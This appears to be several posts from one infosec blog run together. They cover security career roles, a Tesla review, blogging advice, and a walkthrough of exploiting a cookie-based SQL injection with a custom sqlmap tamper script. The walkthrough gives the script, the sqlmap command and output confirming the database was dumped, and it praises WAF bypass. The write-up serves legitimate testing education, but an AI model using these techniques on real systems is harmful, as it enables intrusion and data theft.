Beyond this map, I‚Äôve provided some additional context, gotcha‚Äôs and other notes related to the map itself. Notes on the MapAlright, so you‚Äôve seen the map and I expect many will have questions or things about it they wish to challenge. Let me try to address some areas of improvement and provide additional context around my thinking‚Ä¶ It‚Äôs very possible something on the map is not where it should be, could be reclassified or something is missing. If you think so, I‚Äôd love to hear about it so I can make edits to the map! Though these roles can exist independently, many of us in the industry know that you are likely to ‚Äúwear many hats‚Äù, especially if you work for smaller organizations. As such, many people who see this map may identify as two or even more things here that may even exist in multiple different categories. I like to consider ‚ÄúVulnerability Management‚Äù both an offensive security role as well as a blue- ish security operations role. Maybe I‚Äôm biased having gotten my start in VM, but I think most in the field of offensive security would at least agree that identifying vulnerabilities (recon / enumeration) is a big part of the offensive methodology. Thus, I consider VM the starting point for offensive ops. I also definitely consider it in many ways an ‚Äúoperations‚Äù role. There are a bunch of things (on the right-side of the map) that I had trouble classifying into their own group. Maybe there is a good category to shove them in but for now they float. By ‚ÄúCybersecurity Training‚Äù, I merely mean the act of teaching other security professionals infosec topics. Compared to ‚ÄúUser Awareness Training‚Äù which is about teaching non-security personnel how to maintain security awareness. ‚ÄúSecurity Engineering‚Äù is a role that could easily be applied to just about anything. For the purpose of this map, I‚Äôm considering ‚Äúengineering‚Äù to be related to the build, integration and deployment of security tooling - with an emphasis on build. Again, it‚Äôs easy to apply the ‚Äúengineering‚Äù title to other disciplines but I think this is a decent way of viewing things. ‚ÄúProduct Security‚Äù (or Product / Platform security) is where I‚Äôve decided to lump in individual, specialized security disciplines (e. g. things like - Windows, Linux, ICS, Juniper, etc‚Ä¶) - Essentially, those who are specialized in securing specific products or platforms. I‚Äôve left it as orange to designate it too as an ‚Äúengineering‚Äù discipline. OutroAlright, I hope this helps give you a better idea of the different roles within infosec! In addition to this, I recommend you check out Daniel Miessler‚Äôs piece on ‚ÄúRainbow Teams‚Äù or even look at how ISC2 defines the various security domains. I also think this Career Pathway Roadmap from NICCS is a great way to visualize your path into any of the various roles described in this post. Finally, for any suggestions, corrections, comments or anything else, I always appreciate feedback!

The OWASP Top 10 (for those who aren‚Äôt familiar) represents the top 10 ‚Äúmost critical security risks to web applications‚Äù and is developed (by OWASP) using a broad consensus from within the (global) appsec community. ‚ÄúRisk‚Äù in this case, is measured not only on severity and impact but also on the relative frequency of the vulnerability class. In other words, SQLi is consistently ranked at the top, year after year, not only because it represents significant risk to any given application (and potentially its underlying infrastructure) but also because it is very frequently found. There are many variants of SQLi, yet finding and subsequently exploiting this flaw is not always trivial. However, application security professionals have a magic weapon that does exactly this - SQLMAP! (Find it here or in a Kali image near you!) ___ __H__ ___ ___[(]_____ ___ ___|_ -| . [,] | . '| . ||___|_ [']_|_|_|__,| _| |_|V. . . |_|Before reading any further, know that this is not a guide to using sqlmap. For that, I recommend you check out the Github project for sqlmap and read through it‚Äôs usage documentation. Tamper ScriptsLet‚Äôs discuss the awesomeness that is sqlmap Tamper scripts (invoked using sqlmap via the command-line parameter ‚Äú--tamper=TAMPER‚Äù). To explain Tamper scripts, I‚Äôll start with sqlmap‚Äôs own documentation‚Ä¶ sqlmap itself does no obfuscation of the payload sent, except for strings between single quotes replaced by their CHAR()-alike representation. This option can be very useful and powerful in situations where there is a weak input validation mechanism between you and the back-end database management system. This mechanism usually is a self-developed input validation routine called by the application source code, an expensive enterprise-grade IPS appliance or a web application firewall (WAF). All buzzwords to define the same concept, implemented in a different way and costing lots of money, usually. To take advantage of this option, provide sqlmap with a comma-separated list of tamper scripts and this will process the payload and return it transformed. You can define your own tamper scripts, use sqlmap ones from the tamper/ folder or edit them as long as you concatenate them comma-separated as value of the option ‚Äìtamper (e. g. ‚Äìtamper=‚Äùbetween,randomcase‚Äù). Cool right?! Who doesn‚Äôt want to bypass WAFs? In addition to fuzzing / otherwise-testing poor input validation methods, Tamper scripts are also helpful when targeting particularly challenging injection vectors, an example of which I will describe in detail below‚Ä¶ A Difficult Injection VectorI recently encountered an interesting SQLi vulnerability that was somewhat difficult to inject into, specifically with sqlmap, which is my go-to SQLi exploitation (and often discovery) utility. To set the scene, the web app in question had a simple GET parameter ‚Äúid=1‚Äù. Naturally I first tried to inject directly into the GET parameter but came up empty both with manual exploitation as well as using sqlmap‚Ä¶ [WARNING] GET parameter ‚Äòid‚Äô does not seem to be injectable Bummer‚Ä¶ Taking a closer look at the application logic, I noticed a cookie was being set as a result of submitting the GET request. The cookie was set as shown below‚Ä¶ Set-Cookie: userchl2_info=%7B%22last_book%22%3A%22MQ%3D%3D%22%2C%22userchl2%22%3A%22%22%7DSubsequent requests anywhere within that same subdomain/path would include that cookie value. When (URL-)decoding the cookie value (%7B%22last_book%22%3A%22MQ%3D%3D%22%2C%22userchl2%22%3A%22%22%7D), I get the unencoded value, {‚Äúlast_book‚Äù:‚ÄùMQ==‚Äù,‚Äùuserchl2‚Äù:‚Äù‚Äú}. I can see that the value for the dictionary pair with key ‚Äúlast_book‚Äù appears to be base64 encoded (the equal signs ‚Äú=‚Äù, which serve as base64 padding give this away). Further (base64)-decoding that value I see that MQ== is equal to the value ‚Äú1‚Äù, which is of course the original GET parameter value of id which was also 1! OK, so now that I know how the GET parameter is stored within the cookie, I then inject a properly encoded (remember we must base64 encode the last_book value as well as URL encode the entire cookie value) apostrophe (‚Äò) into that JSON key/value pair to see if I can‚Äôt trigger a SQL error (in typical SQLi testing fashion). After base64 encoding the apostrophe, the result is ‚ÄúJw==‚Äù. After URL encoding the entire payload cookie value I have %7B%22last_book%22%3A%22Jw%3D%3D%22%2C%22userchl2%22%3A%22%22%7D. Submitting this new payload, I find the following SQL error in the response. mysql_fetch_assoc() expects parameter 1 to be resource, boolean given in [redacted]. php Eureka! This error demonstrates that I may indeed have a SQLi flaw. To continue to exploit this manually given the multiple encoding steps as well as the need to inject it into a particular location of the cookie value would be exhausting. Why not instead have sqlmap do the heavy lifting? By default, sqlmap does not handle the transforms and pinpoint accuracy required to pull this off. However, with the added functionality of Tamper scripting, we can extend sqlmap‚Äôs capabilities and do exactly that. Becoming a TampermageSqlmap has a variety of out-of-the-box Tamper scripts, all of which can be found in /share/sqlmap/tamper/. The one‚Äôs that come standard as well as any additional home-brewed scripts will all have the general format shown below‚Ä¶ # Needed importsfrom lib. core. enums import PRIORITY# Define which is the order of application of tamper scripts against# the payload__priority__ = PRIORITY. NORMALdef tamper(payload): ''' Description of your tamper script ''' retVal = payload # your code to tamper the original payload # return the tampered payload return retValUsing a (single) Tamper script is easy, you can even chain multiple Tamper scripts together! Example usage is show below‚Ä¶ $ python sqlmap. py -u http://192. 168. 136. 131/sqlmap/mysql/get_int. php?id=1 --\tamper tamper/between. py,tamper/randomcase. py,tamper/space2comment. py -v 3Of course, there was no exact out-of-the-box script that would do everything I needed in this particular use-case, so I needed to develop my own from scratch or at least modify an existing script. To get me started, I used the base64encode. py Tamper script as a launch point as I knew I needed to do some base64 encoding. This script in it‚Äôs (original) entirety is displayed below‚Ä¶ #!/usr/bin/env python Copyright (c) 2006-2021 sqlmap developers (http://sqlmap. org/)See the file 'LICENSE' for copying permission from lib. core. convert import encodeBase64from lib. core. enums import PRIORITY__priority__ = PRIORITY. LOWdef dependencies(): passdef tamper(payload, **kwargs): Base64-encodes all characters in a given payload &gt;&gt;&gt; tamper( 1' AND SLEEP(5)# ) 'MScgQU5EIFNMRUVQKDUpIw==' return encodeBase64(payload, binary=False) if payload else payloadAlright, so this is a good start. Let‚Äôs recap what I need out of my final Tamper script in order to inject the properly encoded payload in the exact right location‚Ä¶ I need to inject into the userchl2_info cookie value. The payloads generated by sqlmap must be wrapped in the JSON dict {‚Äúlast_book‚Äù:‚Äù[PAYLOAD]‚Äù,‚Äùuserchl2‚Äù:‚Äù‚Äú} (which is the properly formatted value for the injectable cookie). sqlmap payloads must be base64-encoded. The entire cookie value must be URL-encoded. OK‚Ä¶ so to do this, I changed the final return statement in the original base64encode. py Tamper script to the return statement shown below‚Ä¶ return urllib. parse. quote_plus('{ last_book : ' + encodeBase64( 9999 + payload[1:],binary=False) + ' , userchl2 : }')Quickly decomposing this one-liner as it relates to my previously stated requirements‚Ä¶ I can inject my (tamper-transformed) payloads into the cookie as part of a sqlmap command by setting the --cookie parameter to ‚Äò--cookie=‚Äùuserchl2_info=‚Äù‚Äò. In the new return statement, I have {‚Äúlast_book‚Äù:‚Äù‚Äô + [PAYLOAD STUFF] + ‚Äò‚Äù,‚Äùuserchl2‚Äù:‚Äù‚Äú} which satisfies the JSON wrap. Using encodeBase64(‚Äú9999‚Äù + payload[1:],binary=False), I am able to encode the inner-payload as base64. Finally I use urllib. parse. quote_plus(‚Ä¶) to URL-encode the cookie value in it‚Äôs totality. Putting this all-together in my sqlmap command‚Ä¶ sqlmap -u [redacted]. php?id=1 --cookie= userchl2_info= -p userchl2_info --tamper= /usr/share/sqlmap/tamper/base64encode2. py --dbms=MySQL --not-string= expects parameter 1 to be resource --level=3* Remember I discovered the DB was MySQL earlier when I first triggered the SQL error. * I also discovered the ‚Äú--not-string‚Äù when I first triggered the original SQL error. * I‚Äôm not sure why (some more digging is needed), but for this to work, sqlmap must be run with Level 3, --level=3. Running this command I get a lot of output - most importantly I see‚Ä¶ [INFO] heuristic (basic) test shows that Cookie parameter ‚Äòuserchl2_info‚Äô might be injectable (possible DBMS: ‚ÄòMySQL‚Äô) Cookie parameter ‚Äòuserchl2_info‚Äô is ‚ÄòGeneric UNION query (NULL) - 1 to 20 columns‚Äô injectable Cookie parameter ‚Äòuserchl2_info‚Äô is vulnerable. In other words, this injection vector was successful and I was indeed able to dump the database. The big takeaway here is that Tamper scripts are awesome and you can easily create your own which can precisely target and ruthlessly fuzz potential injection vectors. I now graduate as a sql(map) Tamper-wiz!

I'm amped to share,and transform your view. The joule of my garage,it never stays static. Caught lightning in a bottle,did Elon so emphatic. In a flash you will see,what I bring to light. My current thoughts of Tesla,so don't storm off, take flight. My poetic energy fades,we must bolt to it. So watt are we waiting for,We've come full circuit. Update as of January 30, 2025: Given the current state of things with Tesla, and more specifically, with its owner, I felt compelled to add a quick note here. I still love EVs, and I think. . . despite everything, that Teslas are \*still\* great cars. BUT! I wouldn't recommend you buy one, not anymore. I also want to emphatically state that what Elon has chosen to stand for, is anti- everything I stand for. Yes, that is a poem about a review about Tesla. No, I‚Äôm not ashamed of this. As you may be able to tell, I‚Äôm a big fan of Tesla! I‚Äôve been a Tesla EVangelist for years and have answered many a question during that time. And though there are far more EV‚Äôs (especially Teslas) on the road now than there were 3 years ago when I took delivery of my Model 3, I still see a lot of the same questions, FUD and unquenched curiosity. This piece is designed to address these areas. More specifically though, this is a review of my (2018) Model 3, which I've newly renamed Thundermage in honor of this review. Common Questions &amp; Misconceptions Positives Negatives Other, Neutral StuffCommon Questions &amp; MisconceptionsIn this first section, I will answer the most common questions I am asked about Tesla and EV‚Äôs in general. I‚Äôll also address some common misconceptions. For other information, check out Tesla‚Äôs new owner FAQ! How do I charge it? How fast does it charge? How much does it cost to charge? What kind of range does it have? How do I get into or out of the car? Will I get stuck? EVs aren‚Äôt any more green than gas carsHow do I charge it?: Tesla provides a relatively comprehensive guide to charging on their site. In that guide, they discuss home charging, destination charging and supercharging. The bottom line is, you have a lot of options when it comes to charging. I‚Äôll dive into these options below. 120v outlet : Yep! You can charge on a standard wall outlet, and many people go this route for their primary, every-day charging solution! Charge times are a little slower but it can get the job done, especially if you have all night to juice up. This is great when you think about it because outlets such as these are pretty ubiquitous. Anywhere where you can charge your phone, you can charge your car! At your grandma‚Äôs house? Plug it in! At an Airbnb? Plug it in! You can charge this thing anywhere. In fact, all Teslas come with the Mobile Connector Bundle which includes the 120v outlet adapter. Tesla Wall Connector : For home charging, Tesla‚Äôs (and my) recommended method is the Tesla Wall Connector. At $500 it‚Äôs a little pricey, but if you‚Äôve purchased a $50,000 car that relies on being charged, I think the investment is worth it. I also recommend getting the longer cable (18‚Äô) as it gives you a little additional versatility. For help installing the unit (and I strongly recommend getting professional help), Tesla has provided a resource to find licensed electricians that can take on the project. 240v outlet : If you want a little faster charging but don‚Äôt want to fully commit to Tesla‚Äôs Wall Connector, the 240v outlet is likely the way to go. Typically seen in garages for use with a refrigerator or laundry machine, this is a good EV-agnostic way to get faster charging speeds. In other words, the 240v outlet is a good option if you don‚Äôt want to spend the extra $$ on the Wall Connector or if you plan on having a non-Tesla EV. Destination Charger : So you won‚Äôt always be able to charge at home, so what are your options when out on the road? Well it turns out, there are a TON - and not just bumming small amounts of charge off of random 120v outlets either. Enter Destination Charging - from hotels to restaurants to resorts, destination charging is available at over 4500 sites (and counting). Destination charging is typically on par-with or close-to what you get out of a Tesla Wall Connector or standard 240 outlet. I‚Äôve even found plenty of destination charging that is offered completely for free. What‚Äôs better than free fuel!? For other destination charging, Tesla themselves recommend Plughsare. com DC Fast Charger : Though I haven‚Äôt used one of these myself (thanks to Tesla‚Äôs Supercharger network being so robust), Teslas are also capable of utilizing third-party DC fast charging networks such as Electrify America and EVgo. All you‚Äôll need is the $400 CHAdeMO Adapter - ouch! Tesla Supercharger : Saving the best for last, there is Tesla‚Äôs incredible Supercharger network. This network represents the largest collection of fast-chargers in the world and they are designed and made available exclusively to Teslas (for now). This is the primary means for charging while on road trips. It‚Äôs fast, convenient and with 25000+ stalls world-wide, available pretty much no matter where you are. Superchargers are typically located in parking lots within shopping areas so you can grab food, use the restroom or stay somewhat entertained while you charge up. How fast does it charge?: Charging speeds are typically separated into three categories, L1-L3. These categories are described below. L1 : This typically means the standard 120v outlets. You can expect anywhere from 3-5 miles/hour on average. For a car that needs 300 miles range, this means a charge time of 60-100 hours to charge from zero to full. A little slow but will work in many situations where you only need to get 50 miles or so with an overnight charge. L2 : Level 2 charging includes 240v outlets, Wall Connectors and Destination Charging. L2 will typically net you around 25-45 miles/hour. A zero-to-full charge session would thus take you anywhere from 7-12 hours. Perfect for overnight charging. I should mention though that the top-end of L2 charging (approx. 44 miles/hour) is obtained by using the Tesla Wall Connector with 48 amp output. L3 : Finally, we have the top end charging, Level 3. For Teslas, this typically means Superchargers, but would also include DC Fast Chargers. To answer, ‚Äúhow fast does a Supercharger charge‚Äù though is a little trickier to answer. Current-gen, ‚ÄúV3‚Äù Superchargers can charge at speeds of up to 1000 miles/hour. Wow! But those speeds are only obtained at certain Superchargers and when the vehicle‚Äôs state-of-charge (SoC) is low. When actively charging, as the battery is closer to max capacity, charging speeds dip. Rather than give you numbers here, I can say that anecdotally, while on my road trips, I stop every 2 hours or so to stretch my legs or use the restroom and in that time I plug the car in. After 10-15 minutes, I return to the car with more than enough juice to get to the next stop. This is the recommended approach for road-tripping in a Tesla. Note: Having never used a ‚ÄúDC Fast Charger‚Äù, I really can‚Äôt speak to it‚Äôs charging speeds. Sorry! How much does it cost to charge?: This depends where you charge, and the price of electricity during the time/region you are charging. But to give you an example, I pulled some numbers from my own home charging. Based on my last electric bill, I am on-average billed $. 13/kWh. The Tesla Model 3‚Äôs battery pack is a 75 kWh pack (newer packs have more kWh). This means it costs $9. 75, or about $10, to charge the pack from zero to full. On that 75 kWh, my car gets about 300 miles. So let‚Äôs say 10$ will get you 300 miles range. Now let‚Äôs take a traditional ICE car, like a Toyota Corolla. With a 13. 2 gallon tank and gas prices hovering around $3/gallon, it costs about $40 for a full tank. With approximately 400 miles range, we can take 75% of both the range and that cost and come up with a value of $30 to go an equivalent 300 miles in the Corolla. What we end up with is a difference in price for home-charging the Tesla at 1/3 the price of gas as compared with the Corolla for the same amount of miles. Now many also ask about the price of Supercharging. The cost of Supercharging is about 2x the cost of home charging, typically around $. 26-$. 28/kWh (compared to the $. 13/kWH I was getting at home). Doubling the cost of electricity still leaves you with a final cost of 2/3 the amount of gas. I will add that the numbers I used for home charging were based on average cost of electricity during a one month span. It is important to note that charging your car in off-peak hours will result in cheaper costs per kWh. So if you are home-charging in the dead of night, it will actually be even cheaper than calculated to juice up the car. What kind of range does it have?: When I first took delivery of my car, it was rated at 310 miles of range. With that said, three years into ownership and after a full charge, my car normally reports that I have about 290 miles range. This may be due in part to battery degradation, but I know from speaking with Tesla engineers that it is more likely due (in large part) to the way Tesla calculates range. Essentially, the car will determine range based off my normal efficiency, i. e. the way I typically drive. In other words, since I tend to drive somewhat, spirited, the car adjusts my range calculation to take into account the lower efficiency. Neat! How do I get into or out of the car?: This isn‚Äôt a question I get, but it always seems to be a challenge for people when first learning how to get in and out of a Model 3. Unlocking/Getting into a Model 3 Getting out of a Model 3Will I get stuck?: Range anxiety and uncertainty around how and where to charge is by far the biggest fear amongst prospective EV purchasers. And though Teslas and similar EVs have really good range (250+ miles), driving long distances is, in reality, not as simple as just getting in your car and going. There is some level of planning that should go into your drive. In a Tesla, this can be calculated for you by the onboard computer. It will plan your route and give you all the places you should stop to charge. It bases this on a number of factors including distance, elevation gain, temperature and more. What‚Äôs important to take away is that you really need to plan your route and understand where you would like to stop. When driving along major throughways, you can generally count on there being charging every 50 miles or so though. In this case, less planning may be required. EVs aren‚Äôt any more green than gas cars. : A common argument amongst EV-haters is that EVs are no more eco-friendly than gas cars because the way the electricity that is used to charge the car is sourced is not-in-fact ‚Äúgreen‚Äù. This is not accurate. A Quick Study: Using the EPA‚Äôs Power Profiler I can get an idea of my carbon emissions based on the number of kWh I consume in a year in my region (SRVC). Estimating 15000 miles of driving distance with my car that has about 300 miles range, that comes to about 50 complete zero-to-full fill-ups. With a 75 kWh battery pack, this means a total of 3750 kWh of electricity used for charging in a year or 312. 50 kWh/month. At the bottom of the Power Profiler there is an Emissions Estimate function which can take a monthly kWh value and calculate an annual emissions rate based on your particular eGRID subregion (mine is SRVC - SERC Virginia/Carolina). With a usage of approx. 313 kWh/month, my annual estimated emissions is 2,928 pounds CO2. OK, so now let‚Äôs use the carbonfootprint. com calculator to determine the annual CO2 emissions for the Toyota Corolla. Using the calculator, I plug in 15k miles, the 2020 Toyota Corolla CVT 2WD (which according to this calculator has an efficiency score of 165. 363) and I end up with an annual emissions value of 3. 99 metric tons or about 8,000 pounds CO2. So the Corolla produces about 2. 66x more carbon emissions than the Tesla. Not good! PositivesAs I‚Äôve said, I love my Tesla, and there are so many reasons why. I‚Äôve tried to compile these reasons here. Charging at home : Never having to go to a gas station is really one of my favorite perks of the car. You get to laugh smugly as you drive past the sad folk putting stinky dinosaur juice into their cars. Plus, you‚Äôll always have a ‚Äúfull tank‚Äù, or as much juice as you need (as long as you remember to plug it in) thanks to the ability to charge at home. Electricity is cheaper than gas : Mile for mile, electricity is on average much cheaper than gas. Oh, and there are many places where you can charge completely for free - try getting free gas anywhere! Features like scheduled departure and scheduled charging can help get the most cost-efficient home charging as well. It‚Äôs fast : My car (Model 3 Dual Motor) goes 0-60 in about 4 seconds. Even after three years, I still find that punch to be pretty exhilarating. That speed isn‚Äôt just for fun though, being able to quickly position yourself is a highly practical feature, especially when merging on highways. Very bright headlights : I don‚Äôt like driving at night. The headlights on my car makes it a lot more bearable. The glass roof is cool : The glass roof not only looks great but gives the inside of the car a very open feeling. I also love to watch planes as they fly overhead or look at the towering trees/buildings when I am in a wooded or city area. (All of course while I‚Äôm not driving). Frunk space : Where a gas car normally has an engine, a Tesla has a storage area known as the ‚ÄúFrunk‚Äù! Who wouldn‚Äôt appreciate having a little additional storage space? Handles wind well : What I mean here is that even in heavy cross-winds, this car feels incredibly stable. The weight of the car, low center of gravity and the (short) height of the car are primary contributors. The display : The 15‚Äù screen is not only hyper-versatile, it also looks really really cool. Navigation is huge, gaming and other entertainment looks great, it‚Äôs just a really nice experience. The screen takes the place of the traditional instrument cluster. What this means is that your speed gauge is on the screen which is to the right of you rather than directly behind the wheel. Some people fear that this will inhibit them from being able to see their speed as easily. I find that it is just as easy if not easier to see it in large print on the huge screen. Purchase experience : No contest here. Buying a car with a few clicks online is infinitely better than going into a dealership. You can even use Apple Pay! Eco-friendly : As discussed in the section above, this car will produce less carbon emissions than a traditional ICE car. What‚Äôs not to like about that? Especially considering the insane heat wave the US has been experiencing. Range is superb : At 300+ miles, my car has more than enough range for any trip I have thrown at it. Sure, it‚Äôs not as much raw range as some equivalent gas cars, but I never drive 300+ miles in one sitting, so getting to stop and charge up is always a nice respite from sitting in the car. The Supercharger network is great : Superchargers are everywhere! They are typically found in shopping centers so you have access to food and more while charging. Supercharging is cheaper than gas and in my experience (driving on the East Coast), I have never had to wait for a spot. Low maintenance : Tesla‚Äôs guidance on maintenance is very simple. From this guide, there really isn‚Äôt that much that goes into taking care of the car! In the three years I‚Äôve owned the car, I‚Äôve only taken it into the dealership once (a few days after taking delivery to fix a few small aesthetic things). What‚Äôs even better is that when you do have an issue with the car, it‚Äôs highly likely that Tesla will be able to send a Mobile Service vehicle to you which can resolve your maintenance issue without you ever having to leave your house. Awesome! Regenerative braking : Arguably the biggest difference in driving an EV versus driving a traditional ICE car is the regenerative braking. Once you‚Äôre used to it though, I think it offers a superior and far less exhausting driving experience. Essentially, regen-braking allows you to never really have to take your foot completely off the accelerator and put it on your brake. Over the course of a long drive, your feet and legs are less tired without the constant moving and placing. Very safe &amp; secure vehicle : All Teslas are extremely safe cars. NHTSA consistently scores Teslas at 5-stars across the board in their crash-safety tests. Tesla scores so well for a few reasons. First, Teslas are very hard to roll - their low center-of-gravity thanks to the very heavy battery pack in the floor of the car helps contribute to this. Second, with no gas motor, there is less risk of fire/explosion in the event of a crash, plus, the lack of the motor in the front allows the front to be a crumple zone. Finally, Teslas come with a lot of cool, advanced security features standard. Things like the Dashcam, cabin camera, security alarm, pin to drive, sentry mode, intrusion sensors, auto lane adjust, obstacle aware braking, etc‚Ä¶ Onboard Dashcam : Though i‚Äôve just mentioned the Dashcam, it‚Äôs worth mentioning again. Having a built in Dashcam which captures not only the view out of the front of the car but also the sides is really cool and very useful in the event of an accident. What‚Äôs better, you can view Dashcam footage right inside the car on the huge screen. Amazing! Control with your phone : Being able to control the car with my phone is great. I hate carrying keys and now I don‚Äôt have to! I can control climate, charging, trunk/frunk, windows, and even request service all from my Tesla app. Make‚Äôs fart noises : There‚Äôs a built-in whoopie cushion. Hilarious. Gaming : Tesla Arcade includes a number of games including Polytopia, Cat Quest, Fallout Shelter, Stardew Valley, CupHead, BeachBuggy Racing 2, backgammon, solitaire, chess and a bunch of Atari-classics including 2048, Asteroids, Centipede, Super Breakout, Lunar Lander, Missile Command, Millipede, Tempest and Gravitar. Phew! These games are playable via the touch screen, the steering wheel and even via a classic game controller such as an Xbox or Playstation controller. So fun! Entertainment : As long as you have Premium Connectivity, you can enjoy a number of other entertainment options in the car. Netflix, Twitch, Hulu and Youtube are some of the available options at this time. This isn‚Äôt a feature I use much, but when I do need it, it makes sitting in the car really great. OTA updates : A lot of the software-enabled features I have mentioned in this section are things that the car did not originally ship with. Rather, they are features that have been added to the car, all for free. This includes everything from Dashcam to Sentry Mode to Tesla Arcade to the entertainment features. My car has even had improved acceleration pushed to it via software based optimizations. Truly incredible. NegativesThough I love my car, it isn‚Äôt perfect. There are a number of things I wish we‚Äôre different or that are just bad. I‚Äôve listed these below. AC unit is a little weak : I find that the onboard Tesla AC unit is a bit weak. It doesn‚Äôt ever seem to get as cold or as hot as I‚Äôd like it to and it doesn‚Äôt seem to cool or heat very quickly. Compared to my old Toyota Corolla, it definitely falls short. You don‚Äôt really want to lose to a Toyota Corolla. Not a hatchback : My biggest gripe with this car after 3 years is the trunk. It‚Äôs actually quite roomy but really, I wish it was a hatchback. The Model Y has this feature and it‚Äôs much better. EV tax credit has expired : The $7500 federal tax credit for EVs has run out for Tesla. At the time I bought my car, I actually got the full amount. But for those looking to purchase a Tesla these days, you won‚Äôt get any help from the federal government. With that said, there are other state/local incentives to consider. Charging on 120v is slow : Though charging on 120v is really cool and a very useful feature, it doesn‚Äôt change the fact that it is very slow. If you only have an over-night to charge or need to charge up quickly, you‚Äôre going to be disappointed relying on 120v. Self-park does not come standard : The self-parking feature is bundled with the exorbitantly expensive FSD package. I think this is ridiculous. Self-parking has been a feature of far less advanced cars for a long time. I really wish this came standard or was bundled with some other sort of much cheaper premium upgrade. Horn is difficult to trigger : Maybe i‚Äôm just too gentle with my car, but I always find when I try to honk I‚Äôm either not pressing the right spot, or I am not smashing the wheel hard enough. I wish there was just a button. Engaging windshield wipers is not ideal : A couple issues with the windshield wipers. First, the rain-sensing auto-wipers do not work very well. I find that they either don‚Äôt wipe fast enough, fail to wipe at all or wipe when it‚Äôs not really needed. Tesla is apparently attacking this problem with‚Ä¶ a neural net solution? Second, engaging the wipers is a little clunky and non-ideal. You can click the button at the tip of the left wheel stalk to invoke a single wipe, at which point the modal for the wiper speed is brought up on-screen. From there, you must look down and press the speed you‚Äôd like the wipers to be at. This isn‚Äôt great since typically when you are needing the wipers, especially at a higher speed, it is raining and not the best time to take your eyes of the road. Turning radius isn‚Äôt great : Compared to my old Toyota Corolla, I find that the Model 3 has a really bad turning radius. Tires wear quickly : You‚Äôll find that spirited driving is a common occurrence with a Tesla. This tends to wear the tires down quicker. This means more $$ for new tires. People will try to race you : It could be that I‚Äôm just hyper-sensitive to people accelerating off the line, but I always get the sense that people want to race me. The good news is, I always win =). Premium connectivity costs extra : If you want live traffic, video/music streaming or internet browsing capability, you‚Äôll need to subscribe to Tesla‚Äôs Premium Connectivity at $9. 99/month. This isn‚Äôt ideal, but i rarely use any of those features outside of live traffic. Other, Neutral StuffBeyond the good and the bad, there are the things that just, are. I list these ‚Äúneutral‚Äù items below. Warranty : Tesla has what I consider to be a pretty good warranty. The warranty is described as follows‚Ä¶ Basic Vehicle - 4 years or 50,000 mi, whichever comes first + Battery &amp; Drive Unit - 8 years or 120,000 mi, whichever comes first. Wrap UpIt‚Äôs amazing to see Elon‚Äôs master plan for Tesla come to life, I really do believe what he has created is the most fun you could possibly have in a car. Alright! That‚Äôs the end of the ‚ÄúRevue‚Äù. I thank you for reading and I‚Äôd love to hear your feedback. Are you planning on ordering a Tesla? If so, please use my referral code! Agree or disagree with any of the points I made? Let me know about it! Finally, I highly recommend you check out this amazing comic/review by The Oatmeal. It does a better job than I ever could of summing up the real magic of owning a Tesla. " }, { "id": 79, "url": "https://shellsharks.com/you-should-blog", "title": "Why I Blog. You Should Too!", "body": "2021/07/13 - You should start a blog. If you disagree, I certainly understand the hesitancy. I was once like you! I‚Äôm here to convince you otherwise. I‚Äôll start with a short tale about the inception of shellsharks and the unsuccessful blogging attempts which preceded it. Historical ContextI started the shellsharks site in mid-2019. At that time, I had but two ideas for topics to write about - a ‚ÄúGetting Into Infosec‚Äù guide and an idea to catalog all of the ‚Äúnamed‚Äù vulnerabilities (e. g. ‚ÄúHeartbleed‚Äù). Prior to 2019, I tried at least two other times to blog or otherwise ‚Äúwrite‚Äù, both of which fizzled out before I got to a second post. At the time, I blamed this on the usual reasons - not enough time, didn‚Äôt know what to write about, couldn‚Äôt find my ‚Äúniche‚Äù, etc‚Ä¶ What I failed to realize then are a number of things I fully appreciate today, and I‚Äôd like to share those with you. Let me start with what not to worry about when starting a blog‚Ä¶ What Not To Worry AboutIn this section is a list of common concerns &amp; fears people have when faced with the thought of starting a blog. Many of these slowed me down in the beginning but I am here to tell you, don‚Äôt worry about it! I don‚Äôt know how to host a blog : This is an easy fix and it is only a Google search away! You have plenty of options too, with varying degrees of complexity. Sites like Medium can make it easy to get started, WordPress is incredibly popular and has plenty of advanced functionality as well as for-beginners templates and tutorials, and GitHub Pages (which I personally use) can help you host a blog directly out of a GitHub account! There are countless other means too. The important takeaway is that it is easy to start, you need only contend with overchoice. I don‚Äôt know which blog hosting provider is best : This is a classic road block. You know you want to start a blog but get bogged down in picking the best hosting provider or the best of whatever else. Don‚Äôt sweat this too much. Do a little research and pick one that fits most of your needs. If you need to change to a different provider, it‚Äôs easy enough to do. Focus more on getting to the point where you can actually publish content. In the end, your content is mostly text and images, this can be ported anywhere. No one will read my blog : Will you become a well-known blogger? Statistically speaking, probably not. Will someone read what you put on the Internet? Statistically speaking, absolutely! The Internet is vast, and even the most remote corners are accessed. But you don‚Äôt have to write for anyone else. Write for you! Your experiences matter and documenting them for your own historical purpose is a good enough reason to start. I had similar concerns when I started my site but I have found, over time, that people are interested. People will inevitably find and read what you have to say. People will even eventually comment or give you feedback! That feedback may also even be positive! Whether people read it or not is inconsequential. There are plenty of benefits regardless. I don‚Äôt have anything to write about - You write about what you are interested in, working on or generally doing. Unless you are interested in / working on / doing NOTHING, you will always have material! What I publish will be bad or uninteresting : This could only possibly be true if you write about something that no one else is interested in or that no one else is working on something related to. In a world with close to 5 billion Internet users, I doubt you are writing about anything that is THAT niche. In other words, there are like-minded folks out there. They want to read what you have to say. If you‚Äôre worried you aren‚Äôt a strong writer, don‚Äôt worry, you can get better. Everyone starts somewhere. Say what you want to say in the way you say it. I have nothing novel to contribute : I write mostly about infosec topics. You know who else does that? Lots of people. Like, so many people. It didn‚Äôt deter me, nor did it deter all of those awesome creators. It shouldn‚Äôt deter you either. Even if it‚Äôs been said before, it hasn‚Äôt been said in the way you‚Äôre going to say it. People benefit from different perspectives on the same thing. People also benefit from the same perspective on the same thing. I don‚Äôt have a niche : You don‚Äôt need one! Write about whatever you want, as broadly as you want. Sure, some may advise that by writing across a broad range of topics you run the risk of alienating some of your potential readership that would only be interested in your core topics. This may be true, but the way I consume content from blogs is by scrolling through a feed of blogs I follow - if the post looks interesting to me, I read it. Otherwise, I scroll past. In other words, unless I am absolutely spammed with content unrelated to what I am interested in, I wouldn‚Äôt unsubscribe from a blog which had previously posted content I was interested in. I‚Äôll add that people in general have broad interests. If you write broadly, you will reach a larger audience. I for example write about infosec, non-infosec-tech stuff and life in general! I‚Äôm not an expert : You don‚Äôt need to be. A lot of people aren‚Äôt ‚Äúexperts‚Äù. That perspective is not only valuable, it‚Äôs also more relatable. You don‚Äôt need to pass yourself off as the authority on a subject. Simply explain who you are, what your experience is and then write 